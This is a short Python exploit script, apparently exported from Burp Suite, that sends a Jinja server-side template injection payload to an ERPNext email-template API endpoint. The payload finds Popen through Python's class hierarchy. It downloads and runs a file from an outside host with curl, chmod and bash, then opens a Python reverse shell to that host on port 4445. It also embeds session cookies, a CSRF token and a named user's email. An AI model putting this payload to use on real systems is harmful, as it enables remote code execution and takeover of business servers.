import requests

session = requests.session()

burp0_url = "http://erpnext:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
burp0_cookies = {"sid": "4f75732cfa19f9b9647a665ad7a6530b71151cf14032e6bee4452302", "system_user": "yes", "user_id": "zeljka.k%40randomdomain.com", "user_image": "", "full_name": "Zeljka%20Kola%C5%A1inac"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "2e24dd54110057da7a6a4e62a3311b6747f213931a45bd13196e0c98", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
burp0_data = {"template_name": "nvopf", "doc": "{\"creation\":\"2022-11-10 15:38:03.631756\",\"name\":\"nvopf\",\"modified\":\"2022-11-10 21:26:34.331296\",\"doctype\":\"Email Template\",\"owner\":\"zeljka.k@randomdomain.com\",\"docstatus\":0,\"modified_by\":\"zeljka.k@randomdomain.com\",\"response\":\"<div>{% set string = \\\"ssti\\\" %}</div><div>{% set class = \\\"__class__\\\" %}</div><div>{% set mro = \\\"__mro__\\\" %}</div><div>{% set subclasses = \\\"__subclasses__\\\" %}</div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{% for x in subclasses_r %}</div><div>{% if 'Popen' in x|attr('__qualname__')%}</div><div>{{ x([\\\"/usr/bin/touch\\\" ,\\\"/tmp/bananas\\\"]) }}</div><div>{{ x([\\\"/usr/bin/curl\\\" ,\\\"http://192.168.119.139/jinja-ssti-test-env/shell\\\", \\\"-o\\\", \\\"/tmp/simpdaddy\\\"]) }}</div><div>{{ x([\\\"/bin/chmod\\\" ,\\\"+x\\\", \\\"/tmp/simpdaddy\\\"]) }}</div><div>{{ x([\\\"/bin/bash\\\",\\\"-c\\\",\\\"/tmp/simpdaddy\\\"]) }}</div><div>{{ x([\\\"/usr/bin/python3\\\",\\\"-c\\\",\\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.119.139',4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\\\"]) }}</div><div>{% endif %}</div><div>{% endfor %}</div>\",\"idx\":0,\"subject\":\"nvopf\"}", "_lang": ''}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)